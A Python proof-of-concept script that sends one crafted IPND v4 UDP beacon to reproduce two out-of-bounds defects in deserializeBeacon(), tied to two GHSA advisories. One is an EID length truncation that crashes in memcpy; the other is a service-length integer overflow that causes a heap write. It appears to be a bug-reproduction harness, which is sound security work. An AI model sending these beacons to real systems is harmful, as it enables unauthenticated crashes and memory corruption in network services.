#!/usr/bin/env python3
#
# send_beacon.py HOST PORT WHICH
#
# Send one crafted IPND v4 beacon to HOST:PORT from an ephemeral source port,
# reproducing an out-of-bounds defect in deserializeBeacon() (bpv7/ipnd/beacon.c)
# reachable from an unauthenticated UDP beacon.  WHICH selects the defect:
#
#   eid   -- source-EID length truncation (GHSA-f93p-7w63-4p5p): a 10-byte SDNV
#            encoding a huge length is narrowed to a negative int, bypasses the
#            MAX_EID_LEN check, and reaches memcpy() with a SIZE_MAX size.
#            Deterministic crash on the vulnerable code.
#
#   svc   -- service-definition length integer overflow (GHSA-4fvj-rmh8-wpx9):
#            dataLength = 1 + sdnvLength + attacker_length wraps to a small value,
#            under-allocating the buffer the copy loops then overflow (heap write;
#            reliably caught under AddressSanitizer).
#
# The beacon wire format is: version(1) | flags SDNV | sequence(2) |
# [EID length SDNV | EID] | [service block] | [period SDNV], with flag bits
# EID=0, service-block=1.

import socket
import sys

SDNV_UINT64_MAX = bytes([0x81, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                         0xFF, 0x7F])            # 10-byte SDNV of 2^64-1


def beacon_eid():
    return bytes([
        0x04,               # version 4
        0x01,               # flags SDNV: source-EID present (bit 0)
        0x00, 0x00,         # sequence number
    ]) + SDNV_UINT64_MAX    # source-EID length = 2^64-1 (-> negative int)


def beacon_svc():
    return bytes([
        0x04,               # version 4
        0x02,               # flags SDNV: service block present (bit 1)
        0x00, 0x00,         # sequence number
        0x01,               # number of services = 1
        0x40,               # service number (64)
    ]) + SDNV_UINT64_MAX    # service-data length = 2^64-1 (-> dataLength wraps)


def main():
    if len(sys.argv) != 4:
        sys.stderr.write("usage: send_beacon.py HOST PORT eid|svc\n")
        return 1

    host = sys.argv[1]
    port = int(sys.argv[2])
    which = sys.argv[3]

    if which == "eid":
        data = beacon_eid()
    elif which == "svc":
        data = beacon_svc()
    else:
        sys.stderr.write("unknown beacon type: %s\n" % which)
        return 1

    # ipnd ignores datagrams whose source matches one of its own listen
    # addresses, so the listener uses a loopback alias (127.0.0.9) and this
    # sender uses the default 127.0.0.1 source -- a distinct address, so the
    # beacon is processed rather than dropped as our own.
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(data, (host, port))
    finally:
        sock.close()

    sys.stderr.write("sent %d-byte '%s' beacon to %s:%d\n"
                     % (len(data), which, host, port))
    return 0


if __name__ == "__main__":
    sys.exit(main())
